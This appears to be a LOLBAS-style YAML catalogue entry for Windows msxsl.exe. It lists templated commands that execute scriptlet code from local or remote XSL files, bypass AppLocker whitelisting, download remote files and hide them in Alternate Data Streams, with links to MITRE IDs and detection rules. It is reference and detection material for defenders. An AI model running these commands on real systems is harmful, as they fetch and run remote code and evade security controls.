---
Name: msxsl.exe
Description: Command line utility used to perform XSL transformations.
Author: Oddvar Moe
Created: 2018-05-25
Commands:
  - Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
    Description: Run COM Scriptlet code within the script.xsl file (local).
    Usecase: Local execution of script stored in XSL file.
    Category: Execute
    Privileges: User
    MitreID: T1220
    OperatingSystem: Windows
    Tags:
      - Execute: XSL
  - Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
    Description: Run COM Scriptlet code within the script.xsl file (local).
    Usecase: Local execution of script stored in XSL file.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1220
    OperatingSystem: Windows
    Tags:
      - Execute: XSL
  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
    Usecase: Local execution of remote script stored in XSL script stored as an XML file.
    Category: Execute
    Privileges: User
    MitreID: T1220
    OperatingSystem: Windows
    Tags:
      - Execute: XSL
      - Execute: Remote
  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
    Usecase: Local execution of remote script stored in XSL script stored as an XML file.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1220
    OperatingSystem: Windows
    Tags:
      - Execute: XSL
      - Execute: Remote
  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
    Description: Using remote XML and XSL files, save the transformed XML file to disk.
    Usecase: Download a file from the internet and save it to disk.
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows
  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
    Description: Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).
    Usecase: Download a file from the internet and save it to an NTFS Alternate Data Stream.
    Category: ADS
    Privileges: User
    MitreID: T1564
    OperatingSystem: Windows
Full_Path:
  - Path: no default
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Resources:
  - Link: https://twitter.com/subTee/status/877616321747271680
  - Link: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
  - Link: https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Ronnie Salomonsen
    Handle: '@r0ns3n'
---
